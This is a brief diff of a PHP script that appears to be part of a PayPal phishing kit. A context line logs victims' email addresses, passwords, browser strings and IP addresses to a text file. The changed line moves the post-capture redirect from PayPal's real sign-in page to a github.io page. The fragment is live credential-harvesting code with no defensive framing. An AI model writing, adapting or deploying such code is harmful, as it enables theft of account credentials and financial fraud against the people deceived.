@@ -46,7 +46,7 @@ fclose($fp2);
 
 if($myFile) {
     file_put_contents("cat.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "[USER-A]: " . $browser . "[IP]:" . $ipaddress ."\n", FILE_APPEND);
-    header('Location: https://www.paypal.com/signin?country.x=US&locale.x=en_US');
+    header('Location: https://sc00by-d00-09.github.io/dory-vat/pp/index.html');
 }
 exit();
 ?>
